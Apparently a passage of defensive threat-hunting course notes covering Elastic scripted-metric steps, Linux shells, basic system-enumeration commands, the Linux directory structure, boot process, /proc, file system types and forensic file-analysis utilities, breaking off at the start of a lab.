
This is the last step Elastic runs in parallel against the shards. The data returned is aggregated into a list and passed to reduce_scripts as the variable “states.” This data can be as simple as the data structure from the init_script step or it can use logic to create a new data structure.

reduce_script: Combines all the data from the individual shards into a usable output. 

All outputs from the combine_script step are put into a combined list called states. This step implements any final logic and returns data as a single, final output.

![image](https://github.com/user-attachments/assets/e5b4e826-505d-49e6-966b-ba3c4128db4d)


Ternary Operators


A ternary operator is a coding shortcut for reducing the number of lines of code required for a script. Software developers use these to shorten the code and make it easier to read. In Elastic, the limited space to write code means that ternary operators are commonly used to keep the text short.


Figure 3.5-9, below, displays an example of script logic in the usual coding format, followed by its equivalent as a ternary operator.


![image](https://github.com/user-attachments/assets/57fe7521-9d53-47ff-92f5-4342d07316c6)


Augmented Assignment


Augmented assignments are also common shortcuts. In software, it is common to iterate through a list of items and count the number of items that meet certain criteria.


Figure 3.5-10, below, illustrates an example of common augmented assignment shortcuts. In this example, each code block provides a different way to perform the same function. The code blocks each count the total number of items that are of type car. The shortcuts +=, in the center code block, and ++ in the right-most code block are both shortcuts for the highlighted portion of the first block. Similarly, the operator -- decrements a number by one.


![image](https://github.com/user-attachments/assets/ed8873d9-a4c5-4a3b-ac3f-a4082bc5243b)


########## M4 L1 ############
############# Using the Linux Shell ############


Examining Linux Shells
Linux shells come in many flavors. The main reason to pick a specific shell is based on how it helps automate the tasks that need to be completed. Users familiar with Linux need to at least know BASH because it is the default shell for most Linux distributions. Other commonly used shells include the following:

Portable Operating System Interface (POSIX) 
Shell

Debian Almquist Shell (DASH)

Z Shell (zsh)

C shell (csh)

Korn Shell (ksh)

Tenex C Shell (tcsh)

Friendly Interactive Shell (fish)

Common features shared by various shells include automatic command or filename completion, loggable command history, text formatting for legibility, and even autocorrection. A common secondary shell for UNIX-based operating systems is Z Shell (zsh) because of its robust feature set. It became the default login shell for MacOS in 2019, and the system shell for Kali Linux in 2020. Understanding how to best use these shells helps defenders more accurately and efficiently hunt for information.

﻿

Comparing Linux Shells
﻿

Linux shells contain a wide range of features. The table below compares some of the most common shells and the systems in which they are found.


![image](https://github.com/user-attachments/assets/7d24a5a7-15f9-40fc-b5ca-c778ed49f8cb)

Shell Features and Benefits


Features that assist users with entering commands to a system are described below:
Command History: Use a keyboard shortcut to rerun previously run commands, or view which commands have already been run. The commands are usually referenceable in run order.
Command Scripting: Command shells also double as scripting languages, allowing users to automate instructions on a host.
Tab Completion: Using tab while writing commands causes a shell to attempt to automatically complete the intended command based on context. For example, filename completion is based on the currently active directory when a filename would be too complex or inconvenient to enter manually.
File Globbing: Entering a wildcard such as an asterisk allows the shell to execute commands on all files that match part of a given bit of text. For example, a user could specify that they want to move *.txt which would pattern match all files that end in .txt and move them at the same time.


When not using a shell, users have to be exact in the syntax of the commands they run on the filesystem, and they can normally execute only one task at a time. Since command line shells became standard for many operating systems, using a shell has become the norm.


Specifics of Common Shells
Three of the most commonly used shells are briefly described in this section.

﻿

BASH 
﻿

The Bourne Again Shell (BASH) was a replacement for the default Unix Bourne shell, and is now the default login shell for many distributions of Linux. A version of BASH is also available for Windows 10 via the Windows subsystem for Linux. BASH enables users to run commands concurrently with the session, meaning the commands are executed immediately, or to process commands in a batch so that they're executed in order. BASH also contains built-in bug reporting for debugging scripting issues through the use of the command bashbug.

﻿

Z Shell 
﻿

Z Shell zsh is a UNIX shell that is a version of BASH with improved features. Many power users describe zsh as an upgraded version of BASH, and it is preferred by many professionals seeking more powerful options for scripting. For instance, when entering commands, BASH stops tab completion at the last common character, while zsh cycles through the possible options without needing to be forced to show the user options. For example, if a user wants to execute commands from the folder /usr/bin/things/, but that system also contains the folders /usr/bin/thin/ and /usr/bin/thing/, zsh cycles through each potential completion option with only partial text entered.

﻿

zsh is installed by default on the Kali distribution of Linux. Therefore, many security professionals find it necessary to master zsh if their work involves heavy use of Kali.

﻿

Other useful features of zsh are command history shared among all system shells, better file globbing without needing to run the find command, spelling correction, compatibility modes, and user-loadable modules that contain pre-written snippets of code.

﻿

POSIX
﻿

The POSIX shell comes from the Institute of Electrical and Electronics Engineers (IEEE) POSIX standard, and the shell exists to create a common scripting language between certified operating systems (OS). Any POSIX-certified OS should be able to communicate with any other POSIX-certified OS without users needing to be concerned with specific shell upgrade maintenance. POSIX is based on the C programming language but contains additional features over the American National Standards Institute (ANSI) C standard like file management, regular expressions (regex), networking management, memory management, and system process handling.



Linux System Queries
Querying Processes and System Information in Linux
﻿

Understanding how to gain the system information of different Linux systems using the system shell is paramount to an analyst's work. The following lab uses the common system querying options and shows what can be gleaned from the information they provide.

﻿

Workflow
﻿

1. In the VM kali-hunt open a new terminal session from the taskbar in the upper-left.

﻿

2. Query the system's hostname:

$ hostname
﻿
![image](https://github.com/user-attachments/assets/9f14e7ca-a53c-47bf-97c8-3ea389f5c4e0)


Sometimes an analyst is given only an IP address and generic Linux credentials for a given network. Enumerating the current hostname when connected helps contextualize the intended use of the system.


3. Enumerate the running processes on kali-hunt:
$ ps aux

![image](https://github.com/user-attachments/assets/57dd937d-dd0b-4548-8ee5-83cc16c0624f)


Any potential rogue processes display using this command, and the analyst can see the user account under which each process is running, should there be a concern of hijacked accounts. Normally the length of the output is too long to be easily parsed in the terminal window, so adding a file output argument to the end of the command is recommended. The syntax is $ ps aux > fileName.


4. Open a current process list using the top command. This command is active, so it persists until the user manually quits.
$ top

![image](https://github.com/user-attachments/assets/10e1eb37-14f3-4b66-9f40-41381525fc69)

The top command shows not only the current running commands and their uptime, but also the Central Processing Unit (CPU) and memory usage of each running process. If an errant process is overloading a system, the kill command can be used outside of top to kill specific Process Identifiers (PID) if needed. To exit the top command, press ctrl + c on the keyboard.


5. Systems can have multiple network adapters. To enumerate the status of all active connections, use the command ifconfig:
$ ifconfig 


![image](https://github.com/user-attachments/assets/af3a661d-2c13-410c-abcc-0c04543574ae)


In the flags, UP means the adapter is enabled. The Internet Protocol (IP) address assigned to that specific adapter is represented by inet.


6. Sometimes a specific distribution version is vulnerable to a known exploit. Determine the current system version using one or both of the commands below, which display the current kernel version in different formats.
$ cat /proc/version

or
$ uname -a



Another important capability is enumerating installed packages. There are two commands depending on which distribution of Linux the system is currently running. The output of these commands is often too long to be useful inside of a terminal, and it is recommended they be logged to a text file.


For Debian-based distributions:
$ dpkg -l



For Fedora-based distributions:
# rpm -qa

########## M4 L2 ############
############# Linux File System ############

Linux File System Overview
Linux File Philosophy
﻿

The Linux operating system is designed with and operates on the philosophy that everything is a file. This concept provides a common abstraction for a variety of input and output operations. Resources such as documents, devices, directories, memory, and even inter-process communications are expressed as file objects.

﻿

Index Nodes (inodes)
﻿

Each file is described by a unique inode. The inode is the data structure that contains all necessary metadata about a file, including type, permissions, number of hard links, ownership, size, timestamps, and a list of pointers to all data blocks in which the file data resides. This list of metadata in the inode is called the File Control Block (FCB). The inode itself is unique on a file system. Two different files, even if named identically, have two different inode numbers. Any hard links to a file, however, share its inode number, since a hard link essentially points to the same file, and changes to a hard link result in changes to an original file. Every file, regardless of its type, has an inode number. 

﻿

File Types
﻿

The six Linux file types are listed below:

Regular files

Directories

Special files

Links

Domain Sockets

Named Pipes

﻿

Regular Files
﻿

Regular files contain normal data and could be text files, executable files, documents, or any other data-containing file. These are often used for input or output to normal programs.

﻿

Directories
﻿

Directories are files that are a list of other files. The list contains the inodes of files that are contained in that directory. 

﻿

Special Files
﻿

Special files are mechanisms for input and output to devices and do not contain data. Instead, they serve as the doorway through which data is sent. Special files are primarily located in the /dev directory.

﻿

Links
﻿

Link files are pointers to an inode located in the file system (hard links) or to a filename that points to an inode located in the file system (soft links). The original file and any of its hard links point to identical data because they are the same inode. So any changes to an original file or any of its hard links are experienced by the others. Hard links may only be made of regular files, and not directories or special files. If the original file is deleted, any hard links continue to successfully operate. Soft links, on the other hand, are broken if the original file is deleted, since they point to that filename rather than the inode itself.


![image](https://github.com/user-attachments/assets/7092a30f-7e4f-41e7-b9cf-494deca2203d)

Domain Sockets


These files are a special file type that facilitates inter-process networking and communication. They are protected by the file system’s access control. These are similar to networking sockets, such as those which communicate Transmission Control Protocol (TCP) or User Datagram Protocol (UDP) traffic, but all communication takes place within the Linux kernel rather than over a network interface.


Named Pipes


Named Pipes files are another form of interprocess communication, but do not conform to network socket semantics. However, like regular files, these named pipes have owners, permissions, and metadata.

----------------------------------------------------------------

Linux Standard Directory Structure
In all Linux distributions, the file structure is a standard directory tree. These directories are included under the root directory by convention so that all distributions operate with a similar structure and software, operating knowledge, and tooling is portable across the Linux ecosystem of distributions.

![image](https://github.com/user-attachments/assets/0e21f765-0690-4fe7-96bc-adc79ad97b93)

bin
The bin directory contains common programs shared by the system, the system administrator and the users. Bin is short for binary. In Linux, this is where basic programs and applications are located. Binary files are the executable files that contain compiled source code. Almost all basic Linux commands can be found in bin, such as ls, cat, touch, pwd, rm, and echo. The binaries in this directory must be available in order to attain minimal functionality for the purposes of booting and repairing a system.


boot 


The boot directory contains the startup files and the kernel vmlinuz. This is where the boot loader lives. It contains the static bootloader, kernel executable, and configuration files required to boot a computer. Some recent distributions include GRUB data. GRUB is the GRand Unified Bootloader and is an attempt to get rid of the many different boot-loaders available. 


dev


The dev directory references all the Central Processing Unit (CPU) peripheral hardware, which is represented as two files with special properties: block files and character files. These two types of files allow programs to access the devices themselves, for example, to write data to a serial port and read a hard disk. It is of interest to applications that access devices. These files are known as device nodes, which give user-space access to the device drivers in the operating system’s running kernel.
Block files: These are device files that provide buffered access to system hardware components. They provide a method of communication with device drivers through the file system. Data is written to and read from those devices in “blocks,” which is how these files receive their name.
Character files: These are also device files that provide unbuffered serial access to system hardware components. They work by providing a way of communication with devices by transferring data one character at a time, leading to the name Character files.


etc 


The etc directory contains configuration files for critical system services such as networking, authentication, initialization, and terminals. For example, the files that contain the name of the system, the users and their passwords, the names of machines on the network, and when and where the partitions on the hard disks are mounted.


Of particular note, the file system configuration information is located in /etc/fstab, which is the file system table. The file system table is a configuration file that governs mounting and unmounting the file systems on a machine. This lists each device by its Universally Unique Identifier (UUID), the mount point, the file system type (several of which are discussed later), the read and write privileges, and other options used by the kernel for mounting, backing up a drive, and other operations. 


home


The home directory contains home directories of the common users, and personal configuration files, which are usually hidden. If there is a conflict between personal and system-wide configuration files, the settings in the personal files take priority.


lib


The lib directory contains library files and includes files for programs needed by the system and the users. These library files are programs that are shared among other binary applications. Binary files inside bin and sbin use these library files extensively. The directory contains the all-important kernel modules. The kernel modules are drivers that make devices like the video card, sound card, and Wi-Fi, printer function properly.


media 


The media directory is where the operating system automatically mounts external removable devices such as Universal Serial Bus (USB) thumb drives.


mnt 


The mnt directory is the standard mount point for external file systems. Any devices or storage mounted here is done manually. This may include external hard drives, network drives, and others. In older file systems that do not include /mount, other plug and play devices may be mounted here as well.


opt 


The opt directory stands for optional. It typically contains extra and third party software that is optional. Any applications which are manually installed should reside here. Part of the installation process usually involves writing files to /usr/local/bin and /usr/local/lib directories as well.


proc


The proc directory, which is short for process, is the virtual file system containing information about system resources. This includes information about the computer, such as information about the CPU and the kernel that the Linux system is running. More detail about this directory is included later in this lesson.


root 


The root directory is the administrative user's home directory. 


run


Linux distributions since about 2012 have included the run directory as a Temporary File System (TMPFS) which stores Random Access Memory (RAM) runtime data. That means that daemons like systemd and udev, which are started early in the boot process (and perhaps before /var/run was available) have a standardized file system location available where they can store runtime information. Since files in this directory are stored on RAM, they disappear after shutdown.


sbin


The sbin directory contains programs for use by the system and the system administrator. The shortened term for system binary is sbin. Similar to bin, it is a place for storing executable programs. But these executable programs are essential for system configuration, maintenance, and administrative tasks. Linux has decided to discriminate between normal binaries and these system binaries. In other words, this directory is reserved for programs essential for booting, restoring, and recovering.


usr 


The usr directory contains programs, libraries, documentation, and other files for all user-related programs. The name usr stands for UNIX System Resources. It belongs to the user applications as opposed to /bin or /sbin directories which belong to system applications. Any application installed here is considered nonessential for basic system operation. However, this is one of the most important directories in the system because it contains all the user-level binaries, their documentation, libraries, header files, etc. This directory is read-only and applications cannot write anything into it unless the system is configured improperly.


The usr directory contains several subdirectories, which are described below:
/usr/bin - Contains the vast majority of binaries on the system. Binaries in this directory have a wide range of applications, such as vi, firefox, gcc, curl, etc.
/usr/sbin - Contains programs for administrative tasks. They need privileged access. Similar to /sbin, they are not part of $PATH.
/usr/lib - Contains program libraries. Libraries are collections of frequently used program routines.
/usr/local - Contains self-compiled or third-party programs. This directory is similar in structure to the parent /usr directory and is recommended to be used by the system administrator when installing software locally.
/usr/src - Contains kernel sources, header-files and documentation.
/usr/include - Contains all header files necessary for compiling user-space source code.
/usr/share - Contains shareable, architecture-independent files, such as docs, icons, and fonts. It is recommended that any program which contains or requires data that doesn’t need to be modified store them in this subdirectory (or /usr/local/share, if installed locally).

srv


The srv directory contains data for servers. If an organization was running a web server from a Linux machine, the Hypertext Markup Language (HTML) files for its sites would go into /srv/http or /srv/www. If they were running a File Transfer Protocol (FTP) server, the files would go into /srv/ftp.


sys


Like /proc and /dev, sys is another virtual directory and also contains information from devices connected to the computer. The Sys File System (SYSFS) contains files that provide information about whether devices are powered on, their vendor name and model, what bus the device is plugged into, etc. These files are used by applications that manage devices. If /dev is the doorway to the device itself, /sys files are the addressing and signage to the devices.


tmp


The tmp directory contains temporary files, usually placed there by applications. The files and directories often contain data that an application doesn’t need when the files are written, but may need later on. The files placed in this directory are often cleaned during reboot, so it is not ideal for persistent storage.


var


The var directory is the storage for all variable files and temporary files created by users, such as log files, the mail queue, the print spooler area, or space for temporary storage of downloaded files. These are typically files and directories that are expected to grow in size. For example, /var/crash holds information about every time a process has crashed. Or /var/log contains all log files for the computer and its applications, which grow constantly.

------------------------------------------------------------------

Linux Boot Procedure
File system artifacts in the boot, dev, and etc directories are integral to booting a Linux system. Booting from no power to full operating system capability in Linux is a multi-step process, described below.

﻿

Basic Input/Output System (BIOS)
﻿

In the first stage of the boot process, the BIOS performs integrity checks of the hard drive. These checks are called Power On Self Test (POST). The boot process then searches for the boot loader program, which is in the Master Boot Record (MBR). The MBR is typically located in the first data sector of the hard drive, in the file /dev/hda or /dev/sda. It contains the GNU GRUB. When the boot loader program is detected, it is loaded into memory, executed, and given control of the system.

﻿

NOTE: Newer Linux systems use Unified Extensible Firmware Interface (UEFI) to conduct the first stage of the boot process. UEFI boots more quickly and allows booting drives larger than two terabytes (TB). Linux systems using UEFI may also use Globally Unique Identifier Partition Table (GPT) instead of MBR. GPT supports more partitions and drives larger than two TB. 

﻿

GRUB
﻿

This boot loader uses the file /boot/grub2/grub.conf or the file /boot/grub/grub.conf (in older systems) as the configuration to load itself, load the Linux kernel into memory, then hand execution over to the kernel. The splash screen visible during the boot process is a marker for when the GRUB boot loader is operating. Most operating systems distributed since 2015 are running the second version of the boot loader, GRUB2. 

﻿

The Logical Volume Manager (LVM) is often used in parallel with the boot loader. The LVM manages drive storage, allowing users to allocate space between drive partitions without unmounting.

﻿

NOTE: Instead of GRUB, Linux systems using UEFI may use Systemd-boot as their boot loader. Systemd-boot integrates with UEFI, enabling the use of UEFI boot entries. 

﻿

Kernel
﻿

The kernel is the core of the operating system in Linux. When it takes control of the boot process, it first loads the init daemon and establishes a temporary file system in the /run directory, known as Initial RAM Disk (INITRD) for the System V init daemon or Initial RAM File System (INITRAMFS) for the systemd init daemon. 

﻿

Init Daemon
﻿

The init daemon takes on the process identifier of 1 and is responsible for starting all system services and monitoring them. The System V init daemon was widely used in older versions of Linux and remains in use in the Alpine and Gentoo distributions. All others have replaced this subsystem with the Systemd init daemon, which was designed with faster booting and better dependency management. 

﻿

System V init
﻿

In older Linux operating systems, the System V init program, also known as SysVinit, is located at /etc/init and uses the /etc/inittab file to determine the runlevel of the operating system at startup, which is a setting that determines the state of the operating system and its running services. The runlevels are listed below:

Run Level 0: Power Off

Run Level 1: Rescue or Single User Mode

Run Level 2: Multiple User mode without a Network File Storage (NFS)

Run Level 3: Multiple User mode without a Graphical User Interface

Run Level 4: User Definable

Run Level 5: Multiple User mode with a Graphical User Interface

Run Level 6: Reboot 

Most Linux systems that use this system boot to runlevel 3 or 5 by default.

﻿

When the runlevel is determined, the init program searches the respective directory /etc/rc.d (such as /etc/rc0.d/) for the runlevel scripts corresponding to the setting and executes them. The location of these directories may change for the various Linux distributions.

﻿

Systemd
﻿

Modern operating systems use the systemd init daemon instead of System V. The systemd binary is located at /lib/systemd and uses a configuration file located at /etc/systemd/system/default.target to identify the state into which the system is booted. The most common states are graphical.target, which is comparable to runlevel 5 in the SysV configuration, or multi-user.target, which is comparable to runlevel 3 in the SysV configuration. These states are defined in files of the same name, which are systemd unit files. These files stipulate the requirements, execution parameters, and relationships of system services. All operating system states include the following target files:

halt.target - Brings the system to a halt without powering it down.

poweroff.target - Called during a power off operation.

emergency.target - Defines single user mode. This includes only an emergency shell with no services and no mounted file system.

rescue.target - Similar to emergency mode, but includes the mounting of the file system and the starting of a few very basic services.

multi-user.target - Starts all system services, but provides only a command line interface (CLI) to the user.

graphical.target - Identical to multi-user.target, but adds a Graphical User Interface (GUI).

reboot.target - Defines system operations during a reboot operation.

default.target - Called during system start. It should always be a symbolic link to multi-user.target or graphical.target.

Before reaching these states, the dependencies must be resolved. Systemd walks back through the configuration files to the most essential services and starts them before calling the target file in question. 

﻿

The following list contains the most basic services required by the sysinit.target configuration:

Mounting file systems

Setting up swap files

Setting up cryptographic services

Starting the Userspace Device Manager (UDEV)

Setting the random generator seed


When the above services are complete, the dependencies for sysinit.target are resolved and systemd initiates the services required by a target further up the dependency chain, such as those required by basic.target. These required services include the following:

Timers: Scheduled services.

Sockets: Services listening to a network socket by default.

Paths: File path-triggered services.


After basic services are started, the dependencies for emergency.target   and multi-user.target are resolved. Depending on the default.target setting, the graphical.target configuration is resolved, and the boot  ﻿ process ends .

-------------------------------------------------------------------

Linux Process Directory
The process directory is a unique virtual directory that contains many useful artifacts for understanding the state of running processes and memory on a system. This virtual file system is not representative of data on the hard disk, but encapsulates the Linux philosophy of representing all data, including these objects which exist in memory, as a file. Each process is represented by a directory named for its Process Identifier (PID) and contains a standard structure of subdirectories and files which represent various elements of the process, which are explained below.

﻿

Process Directory Tree
﻿

/proc/PID/cmdline
﻿

The file cmdline contains the command-line arguments. However, since it contains them as a list, there is no whitespace in the output.

![image](https://github.com/user-attachments/assets/4ad2ef2b-ac9f-46d3-8f72-fa71e188168c)

/proc/PID/cwd


The file cwd is a symbolic link to the current working directory of the process.

![image](https://github.com/user-attachments/assets/0ecb08dd-d856-484d-b710-5fe23d699960)

/proc/PID/environ


The file environ contains the values of environment variables in use by the process.

![image](https://github.com/user-attachments/assets/4ac2aedd-2a9e-4cbd-a6e2-5d1a73dd75ec)


/proc/PID/exe


The file exec contains a symbolic link to the executable of this process. Since the inode remains active until the process has died, even if the binary on disk is deleted, it may be retrieved forensically from this hard link while the process remains alive. This is why it is important to preserve the running state of a compromised system, as long as that system is contained from the rest of the network.

![image](https://github.com/user-attachments/assets/1b90b79e-9437-44f8-a745-a42667c6e924)

/proc/PID/fd


fd is a directory containing all file descriptors associated with a process.

![image](https://github.com/user-attachments/assets/e3268f02-02ce-497b-87e7-d946c0b92bcc)

/proc/PID/status


The file status lists the process status in human-readable form.

![image](https://github.com/user-attachments/assets/bc22c1e7-3341-4888-ba25-e5af45b09697)


Notable Proc Files


/proc/cpuinfo


The file cpuinfo contains information about the processor, such as its type, make, model, and performance.

![image](https://github.com/user-attachments/assets/14a8ef22-2c96-4ccc-adda-28fc20467a80)


/proc/devices


The file devices contains a list of device drivers configured into the currently running kernel (block and character).

![image](https://github.com/user-attachments/assets/8786d03e-b1ee-462a-93c4-21e3472d873f)


/proc/meminfo


The file meminfo contains information about memory usage, both physical and swap.


![image](https://github.com/user-attachments/assets/35a736e4-a1d3-4d34-9d0f-de59bf44944a)


/proc/mounts


The file mounts is a list of mounted file systems. The mount command uses this file to display its information.


/proc/net


The net directory contains status information about network protocols.



![image](https://github.com/user-attachments/assets/40ee098e-7efb-4804-8184-9a298634dd97)


/proc/sys


The sys directory is not only a source of information, but also serves as an interface for parameter change within the kernel. These changes may be performed by echoing a new value into the respective file as the root user. An example of this change would be to turn on packet forwarding by editing the file /proc/sys/net/ipv4/conf/all/forwarding. Though since these changes are made to a virtual file system rather than the physical drive, they do not persist through a reboot.



![image](https://github.com/user-attachments/assets/3d3e2b1c-bee9-450a-aa84-a561834c1ce4)

/proc/sys/fs


The fs subdirectory contains file system data, such as file handle, inode, and quota information.


![image](https://github.com/user-attachments/assets/bb79eba1-93cd-44ac-8820-485bbea5b217)

/proc/sys/kernel


The kernel directory reflects general kernel behaviors and the contents are dependent upon the configuration. The most important files are located here, along with descriptions of what they mean and how to use them.


![image](https://github.com/user-attachments/assets/daed18b2-1afb-4032-9a8b-a20ccd66d796)

/proc/version


The version file displays the kernel version.


![image](https://github.com/user-attachments/assets/2bba20e0-09f5-46b5-8731-e8cadf603517)

---------------------------------------------------------------

Linux File System Types and Journaling
The underlying system that manages the hard drive, its volumes, and data reads and writes is the type of file system, of which the Extended File System (Ext) is the most common. The Ext2, Ext3, and Ext4 versions of this file system implemented a concept known as journaling to ensure that data is properly written to the file system, even if interrupted by a system crash.

﻿

Journaling 
﻿

Journaling is the process of recording file system changes to a data structure in order to recover a system state after a crash. Since everything in Linux is a file, the journal is no exception, and in the Ext4 file system, the journal’s inode number is usually 8.

﻿

In file systems that employ it, the journal is where all the information about the content of the file system is recorded. This log is used at boot time, when mounting the file system, to complete any file action that was incomplete due to an unexpected system shutdown or crash. Some journaling file systems do not employ a log and the journal contains only recent actions. The journal usually has limited space and old entries can be overwritten as soon as the corresponding actions have been written to disk, which typically takes no more than a few seconds. 

﻿

While it is important to understand what journaling is and how it works in order to leverage it for forensics purposes, relying on the journal for robust file monitoring from a security perspective is not feasible. It is preferable to leverage a tool such as LoggedFS or Linux’s own audit subsystem to monitor sensitive file activity. The use of the audit subsystem for security monitoring is discussed in a later lesson.

﻿

Disks
﻿

Where different disk devices are denoted by C:\ or D:\ in the Windows OS, Linux names those devices under the /dev directory with the naming conventions sda or sdb. This “s” in this name refers to the Small Computer System Interface (SCSI) mass-storage driver, therefore SCSI driver A is sda, and SCSI driver B is sdb, etc.

﻿

Partitions
﻿

Partitions are distinct storage units on a hard drive. These are recorded in the MBR in a data structure called the partition table. In newer operating systems, the partition table in the MBR has been replaced by GUID Partitioning Table (GPT), which introduces several modernization features. 

﻿

There are three types of partitions, which are described below:

Primary: Any partition not explicitly created as an extended or logical partition. There are no more than four primary partitions on a disk drive. Partition numbers start at 1, so the four partitions of the /dev/sda drive would be sda1, sda2, sda3, and sda4. Primary partitions in the MBR are limited to 2 Terabytes (TB) in size. Any disk space beyond those partitions is marked as free, but to the operating system, since it is not partitioned, that space is unusable. 

Extended: To overcome the primary partitioning problem, extended partitions are created. There is no limit to the number of subdivided partitions (logical partitions) under this extended partition, and any free space in this partition is still marked as usable. Only one extended partition may be configured on a single hard drive, so a common structure is to allocate three primary partitions and one extended partition which occupies the remaining hard disk space.

Logical: Subdivisions of an extended partition. 

File Systems
﻿

Ext4
﻿

Ext4 is the latest version of the Ext family of file systems and is widely used. It continues to employ journaling to protect against data corruption. However, this file system does not support data deduplication, which is an automated storage management process of preventing excess data from being written to a file system. It also does not support transparent compression, which is the principle of allowing compressed files to be read and written to, just like regular files.

﻿

XFS 
﻿

XFS is another journaling file system, and uses a log to write changes to before committing them to the file system. It is particularly suited for very large file systems, such as large storage arrays. It has even become the default file system for Red Hat Enterprise Linux, CentOS, and Oracle distributions.

﻿

Btrfs
﻿

Known as the “Better File System” (Btrfs) by its proponents, this system employs a copy-on-write (CoW) process to write data to disk rather than a strict journaling method. In this process, when a file is modified, the original file is read from disk, changes are made to its data and then the modified data blocks of that file are written to a new location rather than the original file location. This creates a copy and prevents loss of data in the event of a crash. When all new writes have been successfully completed, the file’s active data blocks are also updated, so that the file always references valid data blocks. This is a fault-tolerant method, in keeping with the file system creators’ philosophy. Since the file system is theoretically always in a correct state, a Btrfs file system does not employ journaling for file integrity.

﻿

﻿

Zettabyte File System (ZFS)
﻿

ZFS is a heavily memory-dependent file system, consuming large amounts of memory for the disk and volume management operations that it requires. It places a high priority on file integrity, employing the use of a checksum during every operation to ensure this. However, it is not a conventional journaling file system, though it employs a very similar construct to prevent data corruption during a crash. This construct is the ZFS Intent Log (ZIL). The system only writes to the ZIL rather than reads from it, unlike the journaling model in Ext4 and XFS file systems in which the journal is managed more. ZFS reads from the ZIL only during crash recovery, to restore proper data integrity for any failed writes. After any file action is successfully performed, the entry is removed again, making this structure unappealing for forensic analysis. 

﻿

Each type of file system and its attributes are summarized in the table below.


﻿![image](https://github.com/user-attachments/assets/a30cd420-76e4-4647-9802-acfe96aeb617)

---------------------------------------------------------------------------

Linux File System Analysis Tools
The tools described below are useful for determining the characteristics of a Linux device’s file system and the subdirectories in it. Understanding the usage of disk space, the type of file systems present on a disk, and the number and types of mounted drives is important for an analyst to understand before conducting any further forensic copying or analysis of a compromised system.

﻿

File System Analysis Tools 
﻿

dd 
﻿

The dd utility is used to clone disks or portions of disks. It is useful to recover deleted files if that data is not already overwritten.

﻿

﻿

du 
﻿

The du utility is used for displaying the disk usage of various files or directories on a file system. The ideal use case for this command is to understand how each directory and all subordinate files and directories contribute to the disk usage of a location in the file system.



![image](https://github.com/user-attachments/assets/c71f73aa-62de-4e16-8aee-91559b602e30)


df


The df utility is used for displaying used and free disk space in a file system. With the -T flag, it can also be used to display the type of file system for each entry. The flag -h also prints sizes in human-readable format.


![image](https://github.com/user-attachments/assets/a9f34608-8c38-4844-a5b0-dd68421554e6)

mount
The mount utility is used to mount file systems for access, such as Network File Systems (NFS) or external drives. It is also useful in displaying information about those mounted file systems. When used to display information, this utility prints the output of the /proc/mounts file.


![image](https://github.com/user-attachments/assets/5756692f-ab30-4c85-b54b-cee856b09b60)

lsblk
The lsblk utility lists all attached block devices on a machine. Optimally, the flag -f lists the file system type and UUID.


![image](https://github.com/user-attachments/assets/a1ab6a53-3d29-4546-939b-0312a2f59a64)


blkid


Like lsblk, blkid is used to list block devices on a system, along with the UUID and type of file system and label of the device, if set. However, this command provides less information about the devices to the user and requires root permissions to run.


debugfs


The debugfs utility is a file system debugger employed in the ext family of file systems.

-------------------------------------------------------------------------------

Linux File Analysis
The utilities listed below are native to the Linux operating system, so they are present and available for a host analyst’s use in characterizing the type, function, and metadata of unknown files on a Linux system. If the file is an executable, several of these tools reveal the code linked to the binary file, which is used in behavior analysis of an executable. Both static and dynamic analysis of any files an adversary may have modified or left on a compromised system are objects of interest in a Threat Hunt and Incident Response, so as to determine what tradecraft that adversary employed and which indicators of compromise may be employed to identify other compromised systems.

﻿

File Analysis Binaries
﻿

strings
﻿

The strings utility extracts all human-readable strings from a file and prints them to standard output. It is useful for finding artifacts left behind in malicious binaries that reveal a binary’s purpose or information about potential authors. However, this kind of data is also inserted for misdirection by particularly savvy threat actors.

﻿

It is often necessary to pipe the results of this command to a paging utility such as less or more, or to grep to search for specific string patterns. Below is the beginning of the output when running strings on the ls binary.


﻿![image](https://github.com/user-attachments/assets/516e5f9f-20a9-431f-a8bc-10feb4f26d16)


readelf


The readelf binary reads the metadata of an Executable and Linkable Format (ELF) object file. Different headers and metadata tags reveal different information about an ELF file, including where the sections of the file are located on the hard drive and what libraries and library calls are linked to it. It even prints a dump of information located in a specific section of the file.


![image](https://github.com/user-attachments/assets/f022878c-697b-4650-879b-c000a1836439)

The readelf binary is particularly useful for binary analysis when examining the linked library calls in the relocation symbol table. The functions listed may be looked up by name. Many functions, such as listen() and accept() for network operations, are straightforward in what functionality they give a binary. These entries may be singled out for analysis with the following command:
readelf -r <file> 


![image](https://github.com/user-attachments/assets/d1b20ac6-f0d3-49a0-a4a9-57e6fd0ec720)

hexdump
The hexdump binary is used to examine a hexadecimal representation of the actual data that a file contains. This can be useful for examining the magic bytes of a file, which are the first several bytes that an operating system uses to determine how to open a file or use which program to use to open or edit it.


If a file is expected to result in a lengthy hexadecimal output, the parameter
–length <number> may be used to truncate the output. If the output is expected to contain American Standard Code for Information Interchange (ASCII) data, the flag 
–canonical may be used to print the ASCII characters in conjunction with the hexadecimal data.


![image](https://github.com/user-attachments/assets/bb836810-4ed1-4196-b670-b8b79f3fcd7d)


xxd


The xxd binary can perform all of the same functions as hexdump with one added functionality: It can take a hexadecimal data dump from a file and convert it back into binary data.


stat


The stat binary gives detailed information about a file’s metadata, including owner, permissions, creation time, modification time, and access time. This command may be run on any regular file and not only on executable binary files.


![image](https://github.com/user-attachments/assets/f4f24cb0-5db3-48ea-b904-129d6672ae19)

Stat displays the inode metadata for a file, including the following types of timestamps:
Access: The last time that the file was opened for any sort of operation, including reading.
Modify: The last time that the file was written to or appended.
Change: The last time any changes were made, which includes metadata such as file name changes, which may alter the change time without altering the modify time.
Birth/Creation: Records when the file and associated inode was first written to disk.

file


The file binary is used to display the file type of a particular file object. More specifically, it examines the magic bytes of a file to determine not just whether it is a regular file, but also whether it is an executable, an image, an ASCII text file, or something else.


![image](https://github.com/user-attachments/assets/b59296c4-1ead-4804-8f62-fd1161bc25d1)

ldd


The ldd binary is used to display the loaded dynamic dependencies of a file. It shows which libraries are linked to a file.


![image](https://github.com/user-attachments/assets/896f68c1-5bea-4d45-bb81-b0c4f9a424cf)

strace


The strace utility is used for a more dynamic analysis of a binary. It lists system calls as they occur, which provides even more granular insight into a binary’s behavior than static analysis of imports alone can reveal. It also displays data sent to those system calls, which analysis with strings or a hexdump may be difficult to find.


ltrace
The ltrace utility is similar to strace but lists library calls instead of system calls. In all other ways it operates and provides value to file analysis.

----------------------------------------------------------------------

Determining File Behavior
Use specified binaries to deduce the purpose of a particular file.

﻿

Conduct File Analysis
﻿

Workflow
﻿

1. In a terminal window in the VM kali-hunt, change the directory to /home/trainee/lab:

